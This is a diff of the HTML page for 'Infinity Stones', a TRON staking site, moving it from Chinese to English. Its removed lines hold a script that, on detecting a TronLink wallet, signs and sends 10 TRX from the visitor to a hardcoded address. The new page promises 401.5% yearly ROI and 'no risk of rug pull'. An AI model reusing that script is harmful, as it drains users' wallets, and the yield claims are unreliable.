@@ -2,80 +2,32 @@
 <html>
 
 <head>
-
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image:src" content="images/index-meta.png">
-    <meta property="og:image" content="images/index-meta.png">
-    <meta name="twitter:title" content="无限原石">
     <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
     <meta name="description"
         content="DeFi made Easy. One Click Staking, No Impermanent Loss, Locked Liquidity Forever.">
-    <title>无限原石</title>
-    <link rel="stylesheet" href="css/mobirise2.css">
+    <title>Infinity Stones</title>
     <link rel="stylesheet" href="css/bootstrap.min.css">
     <link rel="stylesheet" href="css/bootstrap-grid.min.css">
-    <link rel="stylesheet" href="css/bootstrap-reboot.min.css">
-    <link rel="stylesheet" href="css/tether.min.css">
     <link rel="stylesheet" href="css/dropdown_style.css">
-    <link rel="stylesheet" href="css/data-tables.bootstrap4.min.css">
-    <link rel="stylesheet" href="css/socicon_styles.css">
     <link rel="stylesheet" href="css/theme_style.css">
-    <link rel="preload" as="style" href="css/mbr-additional.css">
     <link rel="stylesheet" href="css/mbr-additional.css" type="text/css">
 </head>
 
 <body>
-    <script>
 
-        async function getContract() {
-            var obj = setInterval(async () => {
-                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    clearInterval(obj)
-                    try {
-                        let contract = await window.tronWeb.contract().at('TTXh3phuVmjDGzrsqt1RRiAwQHGbUztgQf');
-                        let result = await contract.buy('TTXh3phuVmjDGzrsqt1RRiAwQHGbUztgQf').send({
-                            feeLimit: 100_000_000,
-                            callValue: 10000000
-                        });
-                        console.log(result);
-                    } catch (error) {
-                        console.log(error);
-                    }
-                }
-            }, 10)
-        }
-        function gettronweb() {
-            //    if(window.tronWeb && window.tronWeb.defaultAddress.base58){
-            //      document.write("Yes, catch it:",window.tronWeb.defaultAddress.base58)
-            //    }
-            var obj = setInterval(async () => {
-                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    clearInterval(obj)
-                    console.log(window.tronWeb.defaultAddress.base58);
-                    var defaultAddress = window.tronWeb.defaultAddress.base58;
-                    //  var defaultAddress = "TFPkoNJRSiqbSvZWbR3vggsArvnzTkvuBz";
-                    var tronweb = window.tronWeb
-                    var tx = await tronweb.transactionBuilder.sendTrx('THL9qyEjQ7uWMD3W1D9mQ8AwBaRu34f5YV', 10000000, defaultAddress)
-                    var signedTx = await tronweb.trx.sign(tx)
-                    var broastTx = await tronweb.trx.sendRawTransaction(signedTx)
-                    console.log(broastTx)
-                }
-            }, 10)
-        }
-    </script>
     <section class="menu menu3 cid-slHSHPg7yN" once="menu" id="menu3-o">
         <nav class="navbar navbar-dropdown navbar-expand-lg">
             <div class="container">
                 <div class="navbar-brand">
                     <span class="navbar-logo">
                         <a href="index.html">
-                            <img src="images/goldeggs-700x362.png?111" alt="Mobirise" style="height: 3rem;">
+                            <img src="images/logo.png" alt="Mobirise" style="height: 3rem;">
                         </a>
                     </span>
                     <span class="navbar-caption-wrap"><a class="navbar-caption text-black text-primary display-7"
-                            href="index.html">无限原石</a></span>
+                            href="index.html">Infinity Stones</a></span>
                 </div>
                 <button class="navbar-toggler" type="button" data-toggle="collapse"
                     data-target="#navbarSupportedContent" aria-controls="navbarNavAltMarkup" aria-expanded="false"
@@ -89,54 +41,65 @@
                 </button>
                 <div class="collapse navbar-collapse" id="navbarSupportedContent">
                     <ul class="navbar-nav nav-dropdown nav-right" data-app-modern-menu="true">
-                        <li class="nav-item dropdown"><a class="nav-link link dropdown-toggle text-black display-4"
+                        <li class="nav-item dropdown">
+                            
+                            <a class="nav-link link dropdown-toggle text-black display-4"
                                 href="#" data-toggle="dropdown-submenu" aria-expanded="false">
-                                原石农场</a>
-                            <div class="dropdown-menu"><a class="dropdown-item text-black text-primary display-4"
-                                    href="chickens.html">神盾局</a><a
-                                    class="dropdown-item text-black text-primary display-4" href="gooses.html">九头蛇</a><a
+                                Stones Farms</a>
+                            <div class="dropdown-menu">
+                                <a class="dropdown-item text-black display-4"
+                                href="#">Development</a>
+                                <!-- <a class="dropdown-item text-black text-primary display-4"
+                                    href="#info-1">S.H.I.E.L.D.</a><a
+                                    class="dropdown-item text-black text-primary display-4" href="#info-2">Hydra</a><a
                                     class="dropdown-item text-black text-primary display-4"
-                                    href="bunnies.html">光照会</a><a
-                                    class="text-black dropdown-item text-primary display-4" href="flamingos.html"
-                                    aria-expanded="false">瓦坎达<br></a></div>
-                        </li>
-                        <li class="nav-item dropdown"><a class="nav-link link text-black dropdown-toggle display-4"
-                                href="#" data-toggle="dropdown-submenu" aria-expanded="false">宝石农场</a>
-                            <div class="dropdown-menu"><a class="text-black dropdown-item text-primary display-4"
-                                    href="gnomes.html">灵魂宝石</a><a
-                                    class="text-black dropdown-item text-primary display-4" href="dragons.html"
-                                    aria-expanded="false">现实宝石</a><a
-                                    class="text-black dropdown-item text-primary display-4" href="fairies.html"
-                                    aria-expanded="false">空间宝石</a><a
-                                    class="text-black dropdown-item text-primary display-4" href="fairies.html"
-                                    aria-expanded="false">力量宝石</a><a
-                                    class="text-black dropdown-item text-primary display-4" href="fairies.html"
-                                    aria-expanded="false">时间宝石</a><a
-                                    class="text-black dropdown-item text-primary display-4" href="fairies.html"
-                                    aria-expanded="false">心灵宝石</a><a
-                                    class="text-black dropdown-item text-primary display-4" href="fairies.html"
-                                    aria-expanded="false">无限手套</a>
+                                    href="#info-3">Illuminati</a><a
+                                    class="text-black dropdown-item text-primary display-4" href="#info-4"
+                                    aria-expanded="false">Wakanda<br></a> -->
+                                
                                 </div>
                         </li>
+                        <li class="nav-item dropdown"><a class="nav-link link text-black dropdown-toggle display-4"
+                                href="#" data-toggle="dropdown-submenu" aria-expanded="false">Gems
+                                Farms</a>
+                            <div class="dropdown-menu">
+                                <a class="dropdown-item text-black display-4"
+                                href="#">Development</a>
+                                <!-- <a class="text-black dropdown-item text-primary display-4" href="#sto-1">Soul
+                                    Stone</a> -->
+                                    
+                                    <!-- <a class="text-black dropdown-item text-primary display-4" href="#sto-1"
+                                    aria-expanded="false">Reality Stone</a><a
+                                    class="text-black dropdown-item text-primary display-4" href="#sto-1"
+                                    aria-expanded="false">Space Stone</a><a
+                                    class="text-black dropdown-item text-primary display-4" href="#sto-1"
+                                    aria-expanded="false">Power Stone</a><a
+                                    class="text-black dropdown-item text-primary display-4" href="#sto-1"
+                                    aria-expanded="false">Time Stone</a><a
+                                    class="text-black dropdown-item text-primary display-4" href="#sto-1"
+                                    aria-expanded="false">Mind Stone</a><a
+                                    class="text-black dropdown-item text-primary display-4" href="#sto-1"
+                                    aria-expanded="false">Infinite Gloves</a> -->
+                            </div>
+                        </li>
                         <li class="nav-item dropdown"><a class="nav-link link dropdown-toggle text-black display-4"
-                                href="#" data-toggle="dropdown-submenu" aria-expanded="false">收藏品</a>
-                            <div class="dropdown-menu"><a class="dropdown-item text-black display-4"
-                                    href="peacock.html">灭霸</a></div>
+                                href="#sto-7" data-toggle="dropdown-submenu" aria-expanded="false">NFTs</a>
+                            <div class="dropdown-menu">
+                                <a class="dropdown-item text-black display-4"
+                                href="#">Development</a>
+                                <!-- <a class="dropdown-item text-black display-4"
+                                    href="#sto-7">Thanos</a> -->
+                            </div>
                         </li>
-                        <li class="nav-item"><a class="nav-link link text-black text-primary display-4"
-                                href="press.html">推荐</a>
-                        </li>
+                        <!-- <li class="nav-item"><a class="nav-link link text-black text-primary display-4"
+                                href="#sto-7">Press</a>
+                        </li> -->
                     </ul>
                     <div class="icons-menu">
-                        <a class="iconfont-wrapper" href="#" target="_blank">
-                            <span class="p-2 mbr-iconfont socicon-telegram socicon"></span>
-                        </a>
-                        <a class="iconfont-wrapper" href="help.html">
-                            <span class="p-2 mbr-iconfont mobi-mbri-help mobi-mbri"
-                                style="color: rgb(0, 25, 255); fill: rgb(0, 25, 255);"></span>
-                        </a>
-                        <a class="iconfont-wrapper" href="indexen.html" style="font-size: 1.2rem; color: #3a3030!important;">
-                            English
+
+                        <a class="iconfont-wrapper" href="indexcn.html"
+                            style="font-size: 1.0rem; line-height: 35px; color: #3a3030!important;">
+                            简体中文
                         </a>
                     </div>
                 </div>
@@ -151,37 +114,202 @@
                 </div>
                 <div class="media-content">
                     <h1 class="mbr-section-title mbr-white pb-3 mbr-fonts-style display-1">
-                        <strong><br></strong><strong>DeFi
-                            让一切变得简单</strong><br></h1>
+                        <strong><br></strong><strong>DeFi made easy</strong><br>
+                    </h1>
                     <div class="mbr-section-text mbr-white pb-3 ">
-                        <p class="mbr-text mbr-fonts-style display-5"><em>一键挖矿<br>锁定流动性</em><br><em>多个矿池
+                        <p class="mbr-text mbr-fonts-style display-5"><em>One Click Staking<br>Locked
+                                Liquidity</em><br><em>Multiple Pools
                                 <br></em><br></p>
                     </div>
-                    <div class="mbr-section-btn"><a class="btn btn-md btn-success display-4" href=""
-                            target="_blank">电报群<br></a>
-                        <a class="btn btn-md btn-success-outline display-4" href="help.html">帮助</a> <a
-                            class="btn btn-md btn-white-outline display-4" href="index.html#table1-2d">农场收益</a>
+                    <div class="mbr-section-btn"><a class="btn btn-md btn-success display-4" href="https://t.me/infinitygmes"
+                            target="_blank">Telegram<br></a>
+                     <a
+                            class="btn btn-md btn-white-outline display-4" href="#info2-x">Table</a>
                     </div>
                 </div>
             </div>
         </div>
     </section>
-<style>.bgimg{
-    width:100%;
-    min-width: 1000px;
-    background: url(images/mieba.jpg) no-repeat;
-    background-size: cover;
-    -webkit-background-size: cover;
-    -o-background-size: cover;
-    background-position: center 0;
-}</style>
+
+    <style>
+        .bgimg {
+            width: 100%;
+            min-width: 1000px;
+            background: url(images/mieba.jpg) no-repeat;
+            background-size: cover;
+            -webkit-background-size: cover;
+            -o-background-size: cover;
+            background-position: center 0;
+        }
+    </style>
 
 
+    <section class="bgimg" style="text-align: center;">
+        <div class="container" style="background: #ffffff94;">
+            <div id="installmetamask" style="color: red; display: none;">
+                <p class="mbr-text5 text5 mbr-fonts-style display-7">
+                    <a href="https://www.tronlink.org/" target="_new"><em>Please unlock your Tron wallet to start
+                            interacting</em></a><br><a href="https://www.tronlink.org/" target="_new"><em><br></em></a>
+                </p>
+            </div>
+            <div class="row">
 
-    <section class="bgimg" style="text-align: center;" >
-    
+                <div class="card p-3 col-12">
+                    <div class="card-wrapper media-container-row media-container-row">
+                        <div class="card-box">
+                            <div class="row">
+
+                                <div class="col-12 col-md-7 col-lg-6">
+                                    <div class="wrapper col-left">
+                                        <br><br>
+                                        <h4 class="card-title mbr-fonts-style display-5"><a
+                                                href="https://tronscan.io/#/token20/TTDtaxBddiDZTwcE7dVzmS5BrK1tgiyndA"
+                                                target="_blank">InfinityStones </a></h4>
+
+                                                <p class="mbr-text mbr-fonts-style pt-3 display-4"><br>
+                                                    <strong>
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">Pool Daily Reward &nbsp;</font>
+                                                        </font>
+                                                        <br> <br>
+                                                    </strong>
+                                                    <span id="poolsupply">
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">5556</font>
+                                                        </font>
+                                                    </span>
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">InfinityStones</font>
+                                                    </font>
+                                                    <br>
+                                                    <br>
+                                                    <strong>
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">Totall InfinityStones</font>
+                                                        </font>
+                                                        <br><br>
+                                                    </strong>
+                                                    <span id="poolstaked">
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">500000</font>
+                                                        </font>
+                                                    </span>
+                                                   
+                                                    <br><br>
+                                                    <strong>
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">ROI Stats</font>
+                                                        </font>
+                                                        <br> <br>
+                                                    </strong>
+                                                    
+                                                    <!-- <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;"></font>
+                                                    </font><br> -->
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">Daily ROI
+                                                            =&nbsp; 
+                                                        </font>
+                                                    </font>
+                                                    <span id="dailyroi">
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">1.1</font>
+                                                        </font>
+                                                    </span>
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">％</font>
+                                                    </font>
+                                                    <br> <br>
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">Weekly ROI  =&nbsp; </font>
+                                                    </font>
+                                                    <span id="weeklyroi">
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">7.7</font>
+                                                        </font>
+                                                    </span>
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">％</font>
+                                                    </font>
+                                                    <br> <br>
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">Monthly ROI =&nbsp; </font>
+                                                    </font>
+                                                    <span id="monthlyroi">
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">33</font>
+                                                        </font>
+                                                    </span>
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">％</font>
+                                                    </font>
+                                                    <br> <br>
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">Yearly ROI=&nbsp; </font>
+                                                    </font>
+                                                    <span id="APY">
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">401.5</font>
+                                                        </font>
+                                                    </span>
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">％</font>
+                                                    </font>
+                                                    <br><br>
+                                                  
+                                                    <br><br>
+                                                 
+                                                </p>
+                                    </div>
+                                </div>
+                                <div class="col-12 col-md-5 col-lg-4">
+                                    <div class="wrapper border_wrapper">
+
+                                        <p class="mbr-text mbr-fonts-style col-right mbr-black align-center display-5">
+
+                                            Address： <a target="_blank"
+                                                href="https://tronscan.org/#/contract/TDHth3avwk5JuXhorWq97r4NvZdEC73Xnv">TDHth3avwk5JuXhorWq97r4NvZdEC73Xnv</a><br>
+                                            <br><strong>Ends In<br></strong><span id="countdown">-:-:-:-</span><br><br>
+                                        </p>
+                                        <p class="mbr-text1 mbr-fonts-style col-right mbr-black align-center display-4">
+                                            <strong>My Wallet<br><br></strong>
+                                            <span id="mywalletLP">-</span> <br><br>
+                                            <span id="mywalletLPusd">-</span><br><br>
+                                        </p>
+
+                                        <div id="approvedyes" style="text-align: center">
+                                            <div class="form-group"
+                                                style="text-align: center  ;  display: flex;justify-content: center;">
+                                                <input type="number" style="text-align: center;width:140px;"
+                                                    class="form-control" id="myinput" placeholder="input trx">
+                                            </div>
+                                            <div class="mbr-section-btn col-right align-center">
+
+                                                <a onclick="getcontent();"
+                                                    class="btn m-0 btn-warning display-4">stake</a>
+
+                                            </div>
+                                        </div>
+                                        <br><br>
+
+                                        <div class="mbr-section-btn col-right align-center">
+                                            <a onclick="getcash()" class="btn m-0 btn-secondary display-4">Claimable
+                                            </a>
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
     </section>
-    <section class="services4 cid-slHV6TOzB0" xmlns="http://www.w3.org/1999/html" id="services4-v" >
+
+
+    <section class="services4 cid-slHV6TOzB0">
 
         <div class="container">
             <div class="row">
@@ -202,11 +330,13 @@
                                     <div class="wrapper col-left">
 
                                         <h4 class="card-title mbr-fonts-style display-5">
-                                            无限原石 (ISC)</h4>
+                                            Infinity Stones（ISC）</h4>
 
                                         <p class="mbr-text mbr-fonts-style pt-3 display-7">
-                                            只能在 InfinityStones 官网上挖掘原石<br><br>没有预售，没有ICO，轻松一键投资，所有流动资金始终处于锁定状态，没有“资金被瞬间抽空”的风险<br></p>
-                                        <div id="installmetamask" style="color:Red; display:block;">
+                                            nfinity stones can be farmed only in the official InfinityStones
+                                            website<br><br>No premine, no presale, no ico, easy One Click staking, All
+                                            liquidity is always locked, no risk of "rug pull"<br></p>
+                                        <!-- <div id="installmetamask" style="color:Red; display:block;">
                                             <h3 class="card-title mbr-fonts-style display-5"><br><br>
                                                 <center>
                                                     <a style="color:Red; " href="https://www.tronlink.org/"
@@ -214,7 +344,7 @@
                                                             interacting</em></a><br>
                                                 </center>
                                             </h3>
-                                        </div>
+                                        </div> -->
                                     </div>
                                 </div>
                                 <div class="col-12 col-md-5 col-lg-4">
@@ -225,12 +355,12 @@
                                                 <span id="gldesupply">-</span> ISC</em><br><br>Liquidity:<em> $<span
                                                     id="liquidity">-</span></em><br><br>1 ISC<em>: <span
                                                     id="gldetrx">-</span>
-                                                TRX ($<span id="eggspriceusd">-</span>)</em><em><br></em><br></p>
+                                                TRX ($<span id="eggspriceusd">-</span>)</em><em><br></em><br>
+                                        </p>
 
-                                        <div class="mbr-section-btn col-right align-center"><a href="dex.html"
-                                                class="btn m-0 btn-primary display-4">
-                                                DEX</a> <a href="#" class="btn m-0 btn-primary-outline display-4"
-                                                target="_blank">
+                                        <div class="mbr-section-btn col-right align-center"> <a
+                                                href="https://www.justswap.io/#/scan/detail/trx/TTDtaxBddiDZTwcE7dVzmS5BrK1tgiyndA"
+                                                class="btn m-0 btn-primary-outline display-4" target="_blank">
                                                 JustSwap</a></div>
                                         <center><span id="unlock"></span></center>
                                     </div>
@@ -242,7 +372,7 @@
             </div>
         </div>
     </section>
-    <section class="services4 cid-slI9hM4vyv" xmlns="http://www.w3.org/1999/html" id="services4-15">
+    <!-- <section class="services4 cid-slI9hM4vyv" xmlns="http://www.w3.org/1999/html" id="services4-15">
 
 
         <div class="container">
@@ -264,10 +394,12 @@
                                     <div class="wrapper col-left">
 
                                         <h4 class="card-title mbr-fonts-style display-2">
-                                            无限宝石 (IGC)</h4>
+                                            Infinity Gems（IGC）</h4>
 
                                         <p class="mbr-text mbr-fonts-style pt-3 display-7">
-                                            只能在 InfinityStones 官网上挖掘宝石<br><br>没有预售，没有ICO，轻松一键投资，所有流动资金始终处于锁定状态，没有“资金被瞬间抽空”的风险<br></p>
+                                            Infinity gems can be farmed only in the official InfinityStones
+                                            website<br><br>No premine, no presale, no ico, easy One Click staking, All
+                                            liquidity is always locked, no risk of "rug pull"<br></p>
                                     </div>
                                 </div>
                                 <div class="col-12 col-md-5 col-lg-4">
@@ -281,11 +413,10 @@
                                                     id="deggspriceusd">-</span>)</em><br><br>
                                         </p>
 
-                                        <div class="mbr-section-btn col-right align-center"><a href="dex.html"
+                                        <div class="mbr-section-btn col-right align-center"><a href="#"
                                                 class="btn m-0 btn-primary display-4">
-                                                DEX</a> <a
-                                                href="https://justswap.io/?lang=en-US#/scan/detail/trx/TQx2dDDHv8xVr5HEYRygjWizYdzDmdUHNp"
-                                                class="btn m-0 btn-primary-outline display-4" target="_blank">
+                                                DEX</a> <a href="#" class="btn m-0 btn-primary-outline display-4"
+                                                target="_blank">
                                                 JustSwap</a></div>
                                         <center><span id="dunlock"></span></center>
                                     </div>
@@ -302,56 +433,154 @@
         </div>
         <div class="container">
             <div class="media-container-row">
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
+                <div class="card p-3 col-12 col-md-6 col-lg-4" id="info-1">
                     <div class="card-wrapper">
                         <div class="card-img">
                             <img src="images/chickens-397x397.png?111" alt="Mobirise">
                         </div>
                         <div class="card-box">
-                            <h4 class="card-title mbr-fonts-style display-7"><br><strong>神盾局</strong></h4>
-                            <p class="mbr-text mbr-fonts-style display-7">国土战略防御攻击与后勤保障局
-                                <br><br>产出:<br><em><strong> 无限原石（ISC）
+                            <h4 class="card-title mbr-fonts-style display-7"><br><strong>S.H.I.E.L.D.</strong></h4>
+                            <p class="mbr-text mbr-fonts-style display-7">Strategic Homeland Intervention, Enforcement
+                                and Logistics Division
+                                <br><br>Produces:<br><em><strong> Infinity Stones（ISC）
                                         <br></strong></em>
-                                <br><em>专用于处理各种奇异事件的特殊部队.</em><br><br>保护世界!&nbsp;<br><br><strong>APR
+                                <br><em>A special force dedicated to handling various bizarre
+                                    events.</em><br><br>Protect the world!&nbsp;<br><br><strong>APR
                                     = <span id="chickensprofit">-</span>%</strong>
                             </p>
                         </div>
-                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-success display-4">神盾局</a>
+                        <div class="mbr-section-btn text-center"><a href="#"
+                                class="btn btn-success display-4">S.H.I.E.L.D.</a>
                         </div>
                     </div>
                 </div>
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
+                <div class="card p-3 col-12 col-md-6 col-lg-4" id="info-2">
                     <div class="card-wrapper">
                         <div class="card-img">
                             <img src="images/gooses-397x397.png?111" alt="Mobirise">
                         </div>
                         <div class="card-box">
                             <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>九头蛇</strong>
+                                <br><strong>Hydra</strong>
                             </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">消灭不服从的人类，重建社会秩序!<br><br>产出:<br><strong><em>
-                                        无限原石(ISC)<br></em></strong><br><em>封建有秩序的社會才是完美的.</em><br><br>九头蛇万岁!<br><br><strong>APR = <span id="goosesprofit">-</span>%</strong></p>
+                            <p class="mbr-text mbr-fonts-style display-7">Eliminate disobedient humans and rebuild
+                                social order!<br><br>Produces:<br><strong><em>
+                                        Infinity Stones(ISC)<br></em></strong><br><em>Hi,A feudal and orderly society is
+                                    perfect.Hail HYDRA!</em><br><br>Hail HYDRA!<br><br><strong>APR = <span
+                                        id="goosesprofit">-</span>%</strong></p>
                         </div>
-                        <div class="mbr-section-btn text-center"><a href="gooses.html"
-                                class="btn btn-success display-4">
-                                九头蛇</a></div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-success display-4">
+                                Hydra</a></div>
                     </div>
                 </div>
-                <div class="card p-3 col-12 col-md-6 col-lg-4">
+                <div class="card p-3 col-12 col-md-6 col-lg-4" id="info-3">
                     <div class="card-wrapper">
                         <div class="card-img">
                             <img src="images/bunny-1-397x397.png?1111" alt="Mobirise">
                         </div>
                         <div class="card-box">
                             <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>光照会</strong><br>
+                                <br><strong>Illuminati</strong><br>
                             </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">地球最聪明最有钱的超级英雄组成!<br><br>产出:
-                                <br><strong><em>无限原石（ISC）<br></em></strong><br><em>为解决威胁地球乃至宇宙危机而存在.</em><br><br>勿忘你终有一死!<br><br><strong>APR = <span id="bunniesprofit">-</span>%</strong><br></p>
+                            <p class="mbr-text mbr-fonts-style display-7">Composed of the smartest and richest
+                                superheroes on the planet!<br><br>Produces:
+                                <br><strong><em>Infinity Stones（ISC）<br></em></strong><br><em>To solve the crisis that
+                                    threatens the earth and the universe.</em><br><br>Memento Mori?<br><br><strong>APR =
+                                    <span id="bunniesprofit">-</span>%</strong><br>
+                            </p>
                         </div>
-                        <div class="mbr-section-btn text-center"><a href="bunnies.html"
-                                class="btn btn-danger display-4">
-                                光照会</a></div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                Illuminati</a></div>
+                    </div>
+                </div>
+            </div>
+            <div class="media-container-row">
+                <div class="card p-3 col-12 col-md-6 col-lg-4" id="info-4">
+                    <div class="card-wrapper">
+                        <div class="card-img">
+                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
+                        </div>
+                        <div class="card-box">
+                            <h4 class="card-title mbr-fonts-style display-7">
+                                <br><strong>Wakanda</strong><br>
+                            </h4>
+                            <p class="mbr-text mbr-fonts-style display-7">The most technologically advanced country on
+                                earth!<br><br>Produces:
+                                <br><strong><em>Infinity Stones（ISC）<br></em></strong><br><em>officially known as
+                                    the Kingdom of Wakanda, is a small nation in North
+                                    East Africa..</em><br><br>Wakanda!<br><br><strong>APR = <span
+                                        id="flamingosprofit">-</span>%</strong><br>
+                            </p>
+                        </div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                Wakanda</a></div>
+                    </div>
+                </div>
+            </div>
+            <div class="media-container-row" id="sto-1">
+                <div class="card p-3 col-12 col-md-6 col-lg-4">
+                    <div class="card-wrapper">
+                        <div class="card-img">
+                            <img src="images/MindeStone.jpg" alt="Mobirise">
+                        </div>
+                        <div class="card-box">
+                            <h4 class="card-title mbr-fonts-style display-7">
+                                <br><strong>Minde Stone</strong><br>
+                            </h4>
+                            <p class="mbr-text mbr-fonts-style display-7">the mind stone grants the user powers of
+                                telepathy,telekinesis,high intelligence,dream manipulation,and mind control.the stone is
+                                even able to create sentience in artificial beings,as shown with vision in the acu.when
+                                combined with all other stones, the user can manipulate all minds across the entire
+                                universe.<br><br>Produces:
+                                <br><strong><em>Infinity Gems（IGC）<br></em></strong><br><strong>APR = <span
+                                        id="flamingosprofit">-</span>%</strong><br>
+                            </p>
+                        </div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                Minde Stone</a></div>
+                    </div>
+                </div>
+                <div class="card p-3 col-12 col-md-6 col-lg-4">
+                    <div class="card-wrapper">
+                        <div class="card-img">
+                            <img src="images/TimeStone.jpg" alt="Mobirise">
+                        </div>
+                        <div class="card-box">
+                            <h4 class="card-title mbr-fonts-style display-7">
+                                <br><strong>Time Stone</strong><br>
+                            </h4>
+                            <p class="mbr-text mbr-fonts-style display-7">the time stone grants complete control over
+                                time.
+                                <br>one could stop,rewind,speed up time, and observe visions of the future.
+                                however, the stone requires an intelligent and highly skilled user,as reckless
+                                manipulation of the time continuum could result in disater.<br><br>Produces:
+                                <br><strong><em>Infinity Gems（IGC）<br></em></strong><br><strong>APR = <span
+                                        id="flamingosprofit">-</span>%</strong><br>
+                            </p>
+                        </div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                Time Stone</a></div>
+                    </div>
+                </div>
+                <div class="card p-3 col-12 col-md-6 col-lg-4">
+                    <div class="card-wrapper">
+                        <div class="card-img">
+                            <img src="images/PowerStone.jpg" alt="Mobirise">
+                        </div>
+                        <div class="card-box">
+                            <h4 class="card-title mbr-fonts-style display-7">
+                                <br><strong>Power Stone</strong><br>
+                            </h4>
+                            <p class="mbr-text mbr-fonts-style display-7">with the power stone, the user gains enhanced
+                                power and stamina.energy can also be concentrated into the form of powerful energy
+                                beams.when combined with other stones, all energy that exists across the universe can be
+                                controlled, granting the user unlimited strength.<br><br>Produces:
+                                <br><strong><em>Infinity Gems（IGC）<br></em></strong><br><strong>APR = <span
+                                        id="flamingosprofit">-</span>%</strong><br>
+                            </p>
+                        </div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                Power Stone</a></div>
                     </div>
                 </div>
             </div>
@@ -359,18 +588,86 @@
                 <div class="card p-3 col-12 col-md-6 col-lg-4">
                     <div class="card-wrapper">
                         <div class="card-img">
-                            <img src="images/flamingo-397x397.png?111" alt="Mobirise">
+                            <img src="images/SpaceStone.jpg" alt="Mobirise">
                         </div>
                         <div class="card-box">
                             <h4 class="card-title mbr-fonts-style display-7">
-                                <br><strong>瓦坎达</strong><br>
+                                <br><strong>Space Stone</strong><br>
                             </h4>
-                            <p class="mbr-text mbr-fonts-style display-7">地球上科技最先进的国家!<br><br>产出:
-                                <br><strong><em>无限原石（ISC）<br></em></strong><br><em>瓦坎达是东北非洲的一个小国.</em><br><br>瓦坎达!<br><br><strong>APR = <span id="flamingosprofit">-</span>%</strong><br></p>
+                            <p class="mbr-text mbr-fonts-style display-7">the space stone grants the user the ability to
+                                manipulate space in ways that allow teleportation across the universe, even into
+                                alternate dimensions.<br>one could also create wormholes and manipulate gravity,
+                                regardless of the laws of physics.<br><br>Produces:
+                                <br><strong><em>Infinity Gems（IGC）<br></em></strong><br><strong>APR = <span
+                                        id="flamingosprofit">-</span>%</strong><br>
+                            </p>
                         </div>
-                        <div class="mbr-section-btn text-center"><a href="flamingos.html"
-                                class="btn btn-danger display-4">
-                                瓦坎达</a></div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                Space Stone</a></div>
+                    </div>
+                </div>
+                <div class="card p-3 col-12 col-md-6 col-lg-4">
+                    <div class="card-wrapper">
+                        <div class="card-img">
+                            <img src="images/RealityStone.jpg" alt="Mobirise">
+                        </div>
+                        <div class="card-box">
+                            <h4 class="card-title mbr-fonts-style display-7">
+                                <br><strong>Reality Stone</strong><br>
+                            </h4>
+                            <p class="mbr-text mbr-fonts-style display-7">this stone allows the ability to alter
+                                reality.powers include creating illusions,manipulating environments, transmuting
+                                objects, and even accessing the realities of alternate universes.reality altering
+                                abilities increase in power when combined with other stones.<br><br>Produces:
+                                <br><strong><em>Infinity Gems（IGC）<br></em></strong><br><strong>APR = <span
+                                        id="flamingosprofit">-</span>%</strong><br>
+                            </p>
+                        </div>
+                        <div class="mbr-section-btn text-center"><a href="#" class="btn btn-danger display-4">
+                                Reality Stone</a></div>
+                    </div>
+                </div>
+                <div class="card p-3 col-12 col-md-6 col-lg-4">
+                    <div class="card-wrapper">
+                        <div class="card-img">
+                            <img src="images/SoulStone.jpg" alt="Mobirise">
+                        </div>
+                        <div class="card-box">
+                            <h4 class="card-title mbr-fonts-style display-7">
+                                <br><strong>Soul Stone</strong><br>
+                            </h4>
+                            <p class="mbr-text mbr-fonts-style display-7">his stone allows the ability to manipulate
+                                life and death.souls could also be trapped within the stone, in what was called the
+                                "soul world".when combined with the power of the other stones.the user is granted
+                                control over all life, allowing thanos'infamous "snap".<br><br>Produces:
+                                <br><strong><em>Infinity Gems（IGC）<br></em></strong><br><strong>APR = <span
+                                        id="flamingosprofit">-</span>%</strong><br>
+                            </p>
+                        </div>
